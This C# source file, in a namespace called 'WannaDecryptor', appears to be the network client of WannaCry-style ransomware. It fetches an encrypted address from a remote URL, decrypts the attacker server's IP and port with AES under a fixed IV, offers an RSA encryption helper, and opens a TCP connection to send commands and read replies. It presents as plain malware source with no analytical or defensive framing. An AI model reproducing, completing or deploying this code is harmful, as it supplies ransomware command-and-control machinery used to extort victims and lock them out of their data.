using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace WannaDecryptor
{
    class Client
    {
        public static Dictionary<string, string> server_info(string WANNACRY_MAIN_SERVER_INFO_URL, string KEY_1, string KEY_2)
        {
            string url = WANNACRY_MAIN_SERVER_INFO_URL;
            string Data = null;
            WebRequest request = null;
            WebResponse response = null;
            Stream resStream = null;
            StreamReader resReader = null;
            try
            {
                string uriString = url;
                request = WebRequest.Create(uriString.Trim());
                response = request.GetResponse();
                resStream = response.GetResponseStream();
                resReader = new StreamReader(resStream);
                string resString = resReader.ReadToEnd();
                Data = resString;
            }
            catch (Exception) { return new Dictionary<string, string>() { { "IP", null }, { "PORT", null } }; }
            finally { if (resReader != null) resReader.Close(); if (response != null) response.Close(); }
            string ip = AESDecrypt(Data.Split(new string[] { "&" }, StringSplitOptions.None)[0], KEY_1);
            string port = AESDecrypt(Data.Split(new string[] { "&" }, StringSplitOptions.None)[1], KEY_2);
            return new Dictionary<string, string>() { { "IP" , ip } , { "PORT" , port } };
        }

        public static string Randomtext(int strLen)
        {
            int rnum = 0;
            int i, j;
            string ranStr = null;
            System.Random ranNum = new System.Random();
            for (i = 0; i <= strLen; i++)
            {
                for (j = 0; j <= 122; j++)
                {
                    rnum = ranNum.Next(48, 123);
                    if (rnum >= 48 && rnum <= 122 && (rnum <= 57 || rnum >= 65) && (rnum <= 90 || rnum >= 97))
                        break;
                }
                ranStr += Convert.ToChar(rnum);
            }
            return ranStr;
        }

        public static string RSAEncrypt(string getValue, string pubKey)
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            rsa.FromXmlString(pubKey);
            byte[] inbuf = (new UTF8Encoding()).GetBytes(getValue);
            byte[] encbuf = rsa.Encrypt(inbuf, false);
            return System.Convert.ToBase64String(encbuf);
        }

        public static string AESEncrypt(string str, string key)
        {
            RijndaelManaged aes = new RijndaelManaged();
            aes.KeySize = 256;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.IV = new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 };
            var encrypt = aes.CreateEncryptor(aes.Key, aes.IV);
            byte[] xBuff = null;
            using (var ms = new MemoryStream())
            {
                using (var cs = new CryptoStream(ms, encrypt, CryptoStreamMode.Write))
                {
                    byte[] xXml = Encoding.UTF8.GetBytes(str);
                    cs.Write(xXml, 0, xXml.Length);
                }

                xBuff = ms.ToArray();
            }
            String Output = Convert.ToBase64String(xBuff);
            return Output;
        }

        public static string AESDecrypt(string str, string key)
        {
            RijndaelManaged aes = new RijndaelManaged();
            aes.KeySize = 256;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.IV = new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 };
            var decrypt = aes.CreateDecryptor();
            byte[] xBuff = null;
            using (var ms = new MemoryStream())
            {
                using (var cs = new CryptoStream(ms, decrypt, CryptoStreamMode.Write))
                {
                    byte[] xXml = Convert.FromBase64String(str);
                    cs.Write(xXml, 0, xXml.Length);
                }

                xBuff = ms.ToArray();
            }
            String Output = Encoding.UTF8.GetString(xBuff);
            return Output;
        }

        public static string Connection(string ip, int port, string command)
        {
            NetworkStream NS = null;
            StreamReader SR = null;
            StreamWriter SW = null;
            TcpClient client = null;
            try
            {
                client = new TcpClient(ip, port);
                NS = client.GetStream();
                SR = new StreamReader(NS, Encoding.UTF8);
                SW = new StreamWriter(NS, Encoding.UTF8);
                string SendMessage = string.Empty;
                string GetMessage = string.Empty;
                SendMessage = command;
                SW.WriteLine(SendMessage); 
                SW.Flush();
                GetMessage = SR.ReadLine();
                return GetMessage;
            }
            catch (Exception) { return null; }
            finally
            {
                if (SW != null) SW.Close();
                if (SR != null) SR.Close();
                if (client != null) client.Close();
            }
        }
    }
}
